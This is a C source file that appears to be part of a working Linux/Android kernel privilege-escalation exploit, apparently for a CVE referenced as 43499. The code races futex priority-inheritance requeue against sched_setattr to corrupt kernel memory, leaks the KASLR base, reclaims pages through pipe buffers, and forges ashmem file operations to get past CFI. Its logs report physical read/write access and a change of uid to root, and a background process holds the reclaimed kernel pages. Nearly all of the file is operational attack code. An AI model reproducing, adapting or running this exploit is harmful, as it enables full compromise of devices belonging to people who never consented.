#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        int consumer_nice = PSELECT_CONSUMER_NICE;
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        int sched_errno = errno;
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else {
          pr_warning("pselect consumer sched_setattr ret=%ld errno=%d tid=%d nice=%d\n",
                     sched_ret, sched_errno, tid, consumer_nice);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
}

static pid_t spawn_allocation_keeper(void) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    return child;
  }

  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
  syscall(SYS_setsid);

  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (null_fd != fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  } else {
    syscall(SYS_close, STDIN_FILENO);
    syscall(SYS_close, STDOUT_FILENO);
    syscall(SYS_close, STDERR_FILENO);
  }

  struct timespec hold = {
    .tv_sec = 86400,
    .tv_nsec = 0,
  };
  for (;;) {
    syscall(SYS_nanosleep, &hold, NULL);
  }
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
static int fops_data_alias_deferred;
static uintptr_t fops_data_alias_deferred_target;
static uint64_t fops_data_alias_deferred_initial;

static int verify_fops_data_alias_before_production(void) {
  uintptr_t saved_gate_page = p0_gate_page_struct;
  uintptr_t saved_probe_page = p0_probe_page_struct;
#if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
    APP_P0_FINGERPRINT_INVERSE_SLIDE
  uintptr_t aliases[] = {
    data_addr(ASHMEM_MISC_FOPS),
  };
  const char *names[] = {"probe-derived"};
#else
  uintptr_t aliases[] = {
    p0_data_alias(ASHMEM_MISC_FOPS) + slide_p0_offset,
    p0_data_alias(ASHMEM_MISC_FOPS),
  };
  const char *names[] = {"with-slide", "without-slide"};
#endif
  uint64_t expected = text_addr(ASHMEM_FOPS);
  int verified = 0;
  int abort_verification = 0;

  for (size_t index = 0; index < sizeof(aliases) / sizeof(aliases[0]);
       index++) {
    int fresh_attempt = 1;
    int search_batch = 0;
#ifdef APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES
    const int max_search_batches = APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES;
#else
    const int max_search_batches = APP_FOPS_FRESH_PAGE_ATTEMPTS;
#endif
    int prepare_oracle = 1;
    while (fresh_attempt <= APP_FOPS_FRESH_PAGE_ATTEMPTS &&
           search_batch < max_search_batches) {
      fops_data_probe_addr = aliases[index];
      fops_data_probe_active = 1;
      if (prepare_oracle) {
        reset_pipe_attempt();
        if (!prepare_p0_pipe_oracle()) {
          pr_error("fops data alias pipe preparation failed candidate=%s\n",
                   names[index]);
          abort_verification = 1;
          break;
        }
        prepare_oracle = 0;
      }
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      search_batch++;
      pr_info("fops data alias search candidate=%s batch=%d/%d "
              "gate_attempt=%d/%d base=%016zx\n",
              names[index], search_batch, max_search_batches,
              fresh_attempt, APP_FOPS_FRESH_PAGE_ATTEMPTS, page_base);
      if (!page_base) {
        pr_warning("fops data alias page unavailable candidate=%s "
                   "fresh=%d/%d\n",
                   names[index], fresh_attempt,
                   APP_FOPS_FRESH_PAGE_ATTEMPTS);
#ifndef APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES
        fresh_attempt++;
        prepare_oracle = 1;
#endif
        continue;
      }

      int gate_triggered =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_SLOT);
      int gate_result = gate_triggered
          ? verify_p0_pipe_oracle_gate()
          : 0;
      pr_info("fops data alias gate candidate=%s fresh=%d/%d "
              "triggered=%d result=%d page=%016zx\n",
              names[index], fresh_attempt,
              APP_FOPS_FRESH_PAGE_ATTEMPTS, gate_triggered,
              gate_result, page_base);
      if (gate_result == 0) {
        pr_warning("fops data alias reclaim miss candidate=%s "
                   "fresh=%d/%d\n",
                   names[index], fresh_attempt,
                   APP_FOPS_FRESH_PAGE_ATTEMPTS);
        fresh_attempt++;
        prepare_oracle = 1;
        continue;
      }

      app_publish_p0_dirty();
      if (gate_result < 0) {
        pr_error("fops data alias gate changed unexpected pages "
                 "candidate=%s\n", names[index]);
        app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
        abort_verification = 1;
        break;
      }

      int alias_triggered =
          app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_SLOT);
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
      /*
       * Keep the redirected pipe_buffer queued across production slot 4.
       * Reading it now would only reconfirm the pre-write ashmem_fops value;
       * reading it after slot 4 directly measures the target word and avoids
       * treating the ashmem/configfs CFI route as a memory-read oracle.
       */
      int result = alias_triggered ? 1 : 0;
      int gate_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
      if (alias_triggered && gate_restored) {
        fops_data_alias_deferred = 1;
        fops_data_alias_deferred_target = fops_data_probe_addr;
        fops_data_alias_deferred_initial = expected;
      }
      pr_info("fops data alias deferred candidate=%s address=%016zx "
              "initial=%016llx gate=%d triggered=%d armed=%d "
              "gate_restored=%d page=%016zx\n",
              names[index], fops_data_probe_addr,
              (unsigned long long)expected, gate_result,
              alias_triggered, fops_data_alias_deferred,
              gate_restored, page_base);
#else
      int result = alias_triggered
          ? verify_p0_pipe_data_page(fops_data_probe_addr, expected)
          : 0;
      int gate_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
      int alias_restored = alias_triggered
          ? app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_RESTORE_SLOT)
          : 0;
      pr_info("fops data alias candidate=%s address=%016zx "
              "expected=%016llx gate=%d triggered=%d result=%d "
              "gate_restored=%d alias_restored=%d page=%016zx\n",
              names[index], fops_data_probe_addr,
              (unsigned long long)expected, gate_result,
              alias_triggered, result, gate_restored,
              alias_restored, page_base);
#endif
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
      if (!gate_restored || !alias_triggered ||
          !fops_data_alias_deferred) {
        pr_error("fops data alias deferred arm failed candidate=%s\n",
                 names[index]);
        abort_verification = 1;
        break;
      }
      if (result == 1) {
        verified = 1;
      }
#else
      if (!gate_restored || (alias_triggered && !alias_restored)) {
        pr_error("fops data alias restore failed candidate=%s\n",
                 names[index]);
        abort_verification = 1;
        break;
      }
      if (result == 1 && alias_triggered && alias_restored) {
#if !defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) || \
    !APP_P0_FINGERPRINT_INVERSE_SLIDE
        data_alias_uses_slide = index == 0;
#endif
        verified = 1;
      }
#endif
      break;
    }
    if (verified || abort_verification) {
      break;
    }
  }

  p0_gate_page_struct = saved_gate_page;
  p0_probe_page_struct = saved_probe_page;
  fops_data_probe_active = 0;
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  if (verified) {
    pr_info("fops data alias retaining verified payload page=%016zx "
            "pipe_page=%016zx production_slot=%d\n",
            page_base, pipebuf_page_base, P0_ORACLE_PRODUCTION_SLOT);
  } else {
    reset_pipe_attempt();
  }
#else
  reset_pipe_attempt();
#endif
  pr_info("fops data alias selected verified=%d runtime_slide=%08zx "
          "uses_slide=%d\n",
          verified, slide_p0_offset, data_alias_uses_slide);
  return verified;
}
#endif

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }
  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
    pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
               kaslr_base, kaslr_slide, slide_p0_offset);
    return 0;
  }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  if (!slide_p0_session_fresh) {
    pr_error("full route requires P0 discovery in the current exploit process; "
             "refusing forced or retained cross-process slide\n");
    return 1;
  }
#endif

#if defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
  if (!verify_fops_data_alias_before_production()) {
    pr_error("fops data alias verification failed; production skipped\n");
    return 1;
  }
#endif

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  pr_info("reusing verified fops payload page=%016zx pipe_page=%016zx\n",
          page_base, pipebuf_page_base);
  if (!is_direct_ptr(page_base) || !is_direct_ptr(pipebuf_page_base)) {
    return 1;
  }
#else
  reset_pipe_attempt();
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
  if (!prepare_p0_pipe_oracle()) {
    pr_error("fops oracle pipe preparation failed\n");
    return 1;
  }
  pr_info("fresh fops oracle pipe page=%016zx\n", pipebuf_page_base);
#else
  pipebuf_page_base = prepare_pipe_buffer_page();
  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 1;
  }
#endif
#endif
#endif

  pin_to_core(CORE);
#if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
    !APP_FOPS_REUSE_VERIFIED_PAGE
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
#endif

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (!page_base) {
    return 1;
  }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("app fops stage=prepare-return base=%016zx\n", page_base);
  if (getenv("FOPS_DIAGNOSTIC_STOP_AFTER_PREPARE")) {
    pr_warning("diagnostic stop after fops prepare; trigger not entered\n");
    if (pipe_prepare_child > 0) {
      SYSCHK(kill(pipe_prepare_child, SIGKILL));
      SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
      pipe_prepare_child = -1;
    }
    return 2;
  }
  pr_info("app fops stage=trigger-enter base=%016zx\n", page_base);
#endif
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
  int fops_oracle_triggered =
      app_trigger_fops_oracle_slot(P0_ORACLE_GATE_SLOT);
  int fops_oracle_gate =
      fops_oracle_triggered ? verify_p0_pipe_oracle_gate() : 0;
  int fops_oracle_restored = 0;
  if (fops_oracle_gate != 0) {
    app_publish_p0_dirty();
    fops_oracle_restored =
        app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_SLOT);
  }
  pr_info("fops-oracle-diag triggered=%d gate=%d restored=%d "
          "page=%016zx object_min=%d delay=%d; stopping before misc_fops\n",
          fops_oracle_triggered, fops_oracle_gate, fops_oracle_restored,
          page_base, APP_FOPS_MIN_OBJECT_INDEX,
          APP_FOPS_PSELECT_DELAY_USEC);
  return 1;
#else
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  const int fops_fresh_page_attempts = 1;
#else
#ifdef APP_FOPS_FRESH_PAGE_ATTEMPTS
  const int fops_fresh_page_attempts = APP_FOPS_FRESH_PAGE_ATTEMPTS;
#else
  const int fops_fresh_page_attempts = 1;
#endif
#endif
  for (int attempt = 1; attempt <= fops_fresh_page_attempts; attempt++) {
    if (attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base) {
        pr_warning("app fops fresh page unavailable attempt=%d/%d\n",
                   attempt, fops_fresh_page_attempts);
        continue;
      }
    }
    int triggered = app_trigger_fops_slide_route();
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
            attempt, triggered);
#endif
    int verified = 0;
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
    int postwrite_result = 0;
    int probe_restored = 0;
    if (fops_data_alias_deferred) {
      postwrite_result = verify_p0_pipe_data_page(
          fops_data_alias_deferred_target, fake_fops);
      probe_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
      pr_info("fops postwrite direct read target=%016zx initial=%016llx "
              "want=%016zx result=%d probe_restored=%d triggered=%d\n",
              fops_data_alias_deferred_target,
              (unsigned long long)fops_data_alias_deferred_initial,
              fake_fops, postwrite_result, probe_restored, triggered);
#if defined(APP_FOPS_DURABLE_POSTWRITE_LOG) && \
    APP_FOPS_DURABLE_POSTWRITE_LOG
      /* Preserve the authoritative result even if RDB dies before
       * dlopen returns.  stdout may be a pipe (adb shell), where fsync
       * returns EINVAL: that is not a failure worth aborting for. */
      fflush(NULL);
      if (fsync(STDOUT_FILENO) != 0 && errno != EINVAL && errno != EBADF) {
        pr_warning("fsync stdout errno=%d\n", errno);
      }
#endif
      fops_data_alias_deferred = 0;
    }
    if (triggered && postwrite_result == 1 && probe_restored) {
      verified = try_cfi_stage();
    } else {
      cfi_last_step = 35;
      cfi_last_errno = 0;
    }
#else
    verified = triggered && try_cfi_stage();
#endif
    pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
            "step=%d errno=%d\n",
            attempt, fops_fresh_page_attempts, triggered, verified,
            cfi_last_step, cfi_last_errno);
    if (verified || cfi_dirty_seen) {
      break;
    }
    pr_info("app fops clean miss; releasing reclaim state before fresh "
            "page attempt=%d/%d\n",
            attempt, fops_fresh_page_attempts);
  }
#else
  for (int attempt = 1; attempt <= 1; attempt++) {
    int triggered = app_trigger_fops_slide_route();
    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
            attempt, triggered);
    int verified = triggered && try_cfi_stage();
    pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
            "step=%d errno=%d\n",
            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
    if (verified || cfi_dirty_seen) {
      break;
    }
  }
#endif
#endif
#else
  run_main_route_threads();
#endif

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
  if (exploit_ok) {
    pid_t keeper = spawn_allocation_keeper();
    pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
               keeper);
  }
  return exploit_ok ? 0 : 1;
}
